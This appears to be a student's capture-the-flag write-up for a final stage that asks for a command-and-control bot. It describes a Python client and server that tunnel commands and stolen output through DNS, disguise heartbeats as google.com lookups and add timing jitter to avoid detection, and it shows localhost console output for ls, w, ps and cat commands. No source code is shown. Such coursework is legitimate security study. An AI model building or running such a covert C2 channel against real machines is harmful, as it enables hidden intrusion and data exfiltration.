Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 534.49 seconds
           Raw packets sent: 3 (116B) | Rcvd: 2 (72B)

```

After logging to the ssh with those credentials, I got this as a result:

```shell
class@ubuntu8:~/bonus$ ssh tinsel@192.168.1.127 -p 22
tinsel@192.168.1.127's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-72-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Overheard at KubeCon: "microk8s.status just blew my mind".

     https://microk8s.io/docs/commands#microk8s.status

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


*****************************************************************
<Grinch> Congratulations! This is the end of stage 3!		*		
								*
<Grinch> Look for presents to get instructions for stage 4!	*
*****************************************************************
Last login: Sat Jan 11 19:07:26 2020 from 192.168.1.173
```

# Stage 4
In the home directory, I found a file named Stocking. After reading it, I got this message:

```shell
tinsel@grinchLair:~$ cat Stocking 
For Final stage (Stage 4) you should desing and implement a C&C bot using the github repo/github gist(https://gist.github.com/).
Design your bot such that it can perform following tasks in the target machine:

	* List files in specified directory
	* List active users
	* List running processes
	* Action of your own choice (Describe in the report)

And report results back to the control server.

Good luck and Merry Xmas! 
---------------------------------------------------------------------------------------------------------------------------------
       _____________,--,
      | | | | | | |/ .-.\   HANG IN THERE
      |_|_|_|_|_|_/ /   `.      SANTA
       |_|__|__|_; |      \
       |___|__|_/| |     .'`}
       |_|__|__/ | |   .'.'`\
       |__|__|/  ; ;  / /    \.-"-.
       ||__|_;   \ \  ||    /`___. \
       |_|___/\  /;.`,\\   {_'___.;{}
       |__|_/ `;`__|`-.;|  |C` e e`\
       |___`L  \__|__|__|  | `'-o-' }
       ||___|\__)___|__||__|\   ^  /`\
       |__|__|__|__|__|_{___}'.__.`\_.'}
       ||___|__|__|__|__;\_)-'`\   {_.-;
       |__|__|__|__|__|/` (`\__/     '-'
       |_|___|__|__/`      |
-jgs---|__|___|__/`         \-------------------
-.__.-.|___|___;`            |.__.-.__.-.__.-.__
  |     |     ||             |  |     |     |
-' '---' '---' \             /-' '---' '---' '--
     |     |    '.        .' |     |     |     |
'---' '---' '---' `-===-'`--' '---' '---' '---'
  |     |     |     |     |     |     |     |
-' '---' '---' '---' '---' '---' '---' '---' '--
     |     |     |     |     |     |     |     |
'---' '---' '---' '---' '---' '---' '---' '---'
					- Joan Stark
--------------------------------------------------------------------------------------------------------------------------------
```

So I started to plan out my C&C app.

## Design
I decided to use dns exfiltration, because I have already analyzed software that could do that. To be exact [DNSExfiltrator](https://github.com/Arno0x/DNSExfiltrator), where I also took a little bit of inspiration. However I completely re-invented the protocol and I have written the whole code in Python. I simplified the actual networking by using `dnslib`, that could create and read DNS packets for me. 

I split the code into two parts: The server side, which has to have some UI and the Client side, which executes the commands from the server. Both of these use a state-machine to decide what to do. 

The server has to know that Client is ready to receive commands. It also needs to give commands to the client. This is done via semi-periodic heartbeat requests, that go from the client to the server. In the server replies, there are hidden respective commands. To make the traffic a little bit less suspicious, I have introduced a gaussian randomness to the periodicity of any communication between the client and the server. 

I also made the format of heartbeats to be less suspicious, as they do not contain anything else, than an existing domain name. (For heartbeats ive chosen `google.com`, as they are the most numerous in the traffic.) The response from the server is also just an IP address, however it is fictional (it can be easily changed in `shared.py`). The most suspicious part of the communication is done via sending data to the server. This part uses (as most other dns-exfiltration tools) long hash-like domain names, which automatically stand out in the traffic.

These are words that the server can send to the client using DNS responses:

| Command | IP      | Args | Meaning                               |
|---------|---------|------|---------------------------------------|
| NOP     | 1.2.3.1 |      | No operation                          | 
| RST     | 1.2.4.3 |      | Reset - Error occured                 |
| ACK     | 1.2.3.4 |      | Acknowledged                          |
| CAT     | 1.2.3.6 | Path | Get contents of a file on Path        |
| PS      | 1.2.3.5 |      | Lists processes on the target machine |
| W       | 1.2.3.3 |      | Lists active users                    |
| LS      | 1.2.3.2 | Path | Lists directory content on Path       |
| SD      | 1.2.2.2 |      | Signals the client for it to  close   |

And this is a table of words the client can send to the server using DNS requests:

| Command  | Domain      | Args | Meaning               | Type |
|----------|-------------|------|-----------------------|------|
| HB       | google.com  |      | Heartbeat - I am here!| TXT  |
| RESP     | ntppool.org | data | Sending data segment  | A    |
| DONE     | nordvpn.com |      | Data stream finished  | A    |


### State machine of the server

When the server gets a new packet, it decides what to do according to this state-machine:
```mermaid
graph TB;

NotRegistered(Not registered)
Registered(Registered)
WaitingForResponse(Waiting for response)
GettingParts(Getting parts)
GotAllData(Got all data)
Error(Error)
FinishedCommand(Finished command)

NotRegistered --> |HB:ACK| Registered
Registered --> |HB:NOP| Registered
Registered --> |User entered command| CommandQueued
CommandQueued --> |HB:Command| WaitingForResponse
WaitingForResponse --> |RESP:ACK| GettingParts
GettingParts --> |RESP:ACK| GettingParts
GettingParts --> |DONE| GotAllData
GotAllData --> |Decoding fine:ACK| FinishedCommand
FinishedCommand --> Registered
GotAllData --> |Decoding failed:RST| Error
Error --> WaitingForResponse
```

### LS and CAT
Those commands require an argument to be passed from the server onto the client. I used the `TXT` request for this. At first, I wanted to use `A` request for the heartbeats, but that would require much more code complexity. Using `TXT` requests so often is much more suspicious, so this might need to be changed in the future.

## Usage
Usage of this program is pretty simple. There is client script and a server script. Server script needs to be launched with these arguments:

| Short   | Long         | Meaning                      | Default     |
|---------|--------------|------------------------------|-------------|
| `-pass` | `--password` | Password for data encryption | `heslo`     |
| `-ip`   | `--ip`       | IP of the server             | `127.0.0.1` |
| `-p`    | `--port`     | Port of the server           | `51271`     |
| `-v`    | `--verbose`  | Verbose logging information  | `False`     | 

And these are the argument for the clients:

| Short   | Long            | Meaning                       | Default     |
|---------|-----------------|-------------------------------|-------------|
| `-pass` | `--password`    | Password for data encryption  | `heslo`     |
| `-d`    | `--destination` | IP of the server              | `127.0.0.1` |
| `-p`    | `--port`        | Port of the server            | `51271`     |
| `-s`    | `--silent`      | Disable logging information   | `False`     |
| `-sp`   | `--source-port` | Port for the client to run on | `51272`     |
| `-f`    | `--fast`        | Fast traffic mode             | `False`     |

There can be multiple clients connected to one server. I tested the application on `localhost` and it worked for three different instances. The server can issue commands to individual clients in parallel, however one client can have assigned only one command at a time. 

![Example setup](setup_for_three_instances.png)

When launched, server will listen for incoming heartbeats of clients and register them. After at least one client is connected, the server allows the user to enter commands for that client. 

```shell
No clients connected.
New client ('127.0.0.1', 51272) registered!

================
0: Refresh
1: ('127.0.0.1', 51272) 
Select your target: 
================
```

There are 5 commands and an exit command the server can issue to the client. Four of these are regular Linux commands: `ls [arg]`, `cat [arg]`, `ps -aux`, `w` and `client-exit` command, which turns the client off.

```shell
================
1: ls
2: w
3: ps
4: cat
5: nop
6: client-exit
7: exit
Command number: 
================
```

After issuing some command to the client, it will enter a `BUSY` state. It will be unavailable for selection, until it finishes the issued command. This can take quite a while (depending on the length of output), especially if the `-f` flag is not set on the clients. 

```shell
================
0: Refresh
1: ('127.0.0.1', 51272) - BUSY
Select your target: 
================
1
You have selected a busy client! Try again when it finishes its task.

================
0: Refresh
1: ('127.0.0.1', 51272) - BUSY
Select your target: 
================
```

After the command is finished, you will see a notification in the console. Then when the display is refreshed, it will display the result of said command:

```shell
================
0: Refresh
1: ('127.0.0.1', 51272) - BUSY
Select your target: 
================
-- ('127.0.0.1', 51272): Answered! Refresh to show it.
0

~~~~~~~~~~~~~~~~
Reply from ('127.0.0.1', 51272) for request: W:
 18:07:18 up 3 days,  8:31,  1 user,  load average: 0,83, 0,99, 1,02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
lactosis tty7     :0                So09    3days  1:06         /bin/sh /usr/lib/gnome-session/run-systemd-session unity-session.target

~~~~~~~~~~~~~~~~

================
0: Refresh
1: ('127.0.0.1', 51272) 
Select your target: 
================
```

Both server and client sides can be safely closed using the `ctrl+c` command.

### Example of two-on-one communication with clients:
```shell
lactosis@Lactosis-NTB:~/Documents/School/BSY/final/BSY-bonus/cc$ python3 server.py 
No clients connected.
-- New client ('127.0.0.1', 51272) registered!

================
0: Refresh
1: ('127.0.0.1', 51272) 
Select your target: 
================
-- New client ('127.0.0.1', 21223) registered!
0

================
0: Refresh
1: ('127.0.0.1', 51272) 
2: ('127.0.0.1', 21223) 
Select your target: 
================
1

================
1: ls
2: w
3: ps
4: cat
5: nop
6: client-exit
7: exit
Command number: 
================
1
Enter argument: /

================
0: Refresh
1: ('127.0.0.1', 51272) - BUSY
2: ('127.0.0.1', 21223) 
Select your target: 
================
2

================
1: ls
2: w
3: ps
4: cat
5: nop
6: client-exit
7: exit
Command number: 
================
2

================
0: Refresh
1: ('127.0.0.1', 51272) - BUSY
2: ('127.0.0.1', 21223) - BUSY
Select your target: 
================
2
You have selected a busy client! Try again when it finishes its task.

================
0: Refresh
1: ('127.0.0.1', 51272) - BUSY
2: ('127.0.0.1', 21223) - BUSY
Select your target: 
================
-- ('127.0.0.1', 21223): Answered! Refresh to show it.
-- ('127.0.0.1', 51272): Answered! Refresh to show it.
0

~~~~~~~~~~~~~~~~
Reply from ('127.0.0.1', 51272) for request: LS:
bin
boot
cdrom
dev
etc
home
initrd.img
initrd.img.old
lib
lib32
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old

~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~
Reply from ('127.0.0.1', 21223) for request: W:
 18:11:01 up 3 days,  8:35,  1 user,  load average: 0,68, 0,84, 0,95
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
lactosis tty7     :0                So09    3days  1:06         /bin/sh /usr/lib/gnome-session/run-systemd-session unity-session.target

~~~~~~~~~~~~~~~~

================
0: Refresh
1: ('127.0.0.1', 51272) 
2: ('127.0.0.1', 21223) 
Select your target: 
================
1

================
1: ls
2: w
3: ps
4: cat
5: nop
6: client-exit
7: exit
Command number: 
================
6

================
0: Refresh
1: ('127.0.0.1', 51272) - BUSY
2: ('127.0.0.1', 21223) 
Select your target: 
================
0

================
0: Refresh
1: ('127.0.0.1', 51272) - BUSY
2: ('127.0.0.1', 21223) 
Select your target: 
================
0
Cleaning up client ('127.0.0.1', 51272) because of inactivity

================
0: Refresh
1: ('127.0.0.1', 21223) 
Select your target: 
================
^CYou pressed Ctrl+C!
Stopping daemon...
```

Commands with arguments offer a "hacky" way of launching commands that are not in the basic instruction set. However these arguments are not encoded in any way in the `TXT` packets, so they are visible to anybody inspecting the traffic. As the commands are executed using `subprocess` python module, it will reject arguments that are too long and I could not come up with a nice example. However, I cannot guarantee that there is no way of exploiting this *feature*.

Finally let's look at the traffic this tool generates. I captured traffic using the `-f` switch

![Traffic](cc_traffic.png)

## Things to do in the future
There are many things this application could have in the future. For example:

* Better user interface - the current version does not have the best visual estetics.
* More rigid protocol - There are edge-cases when the protocol will deadlock and the client has to be restarted. 
* Support for custom console commands
* Support for other protocols other than `DNS`
* Config files for all the constants used throughout the code
* Better calculation of optimal variance for gaussian randomness

## Disclaimer
This tool is intended to be used in a legal and legitimate way only:

* either on your own systems as a means of learning, of demonstrating what can be done and how, or testing your defense and detection mechanisms
* on systems you've been officially and legitimately entitled to perform some security assessments (pentest, security audits)
